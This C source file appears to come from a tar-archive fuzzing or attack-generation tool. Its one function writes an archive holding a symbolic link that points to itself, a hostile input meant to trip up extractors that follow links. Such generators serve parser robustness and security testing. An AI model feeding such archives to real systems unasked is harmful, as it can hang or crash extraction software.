#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../tar_archive.h"
#include "../tar_header.h"
#include "attack_recursive_symlink.h"

void attack_recursive_symlink(const char *output_filename, int index) {
    (void)index;
    tar_archive archive;
    init_tar_archive(&archive);

    tar_header header;
    init_tar_header(&header, "recursive_link", 0);
    // Set the typeflag to '2' to indicate a symbolic link
    header.typeflag = '2';
    // Set the linkname to the same value as the name
    snprintf(header.linkname, sizeof(header.linkname), "recursive_link");

    add_tar_header(&archive, &header);
    finalize_tar_archive(&archive);
    write_tar_archive(&archive, output_filename);
    free_tar_archive(&archive);
}
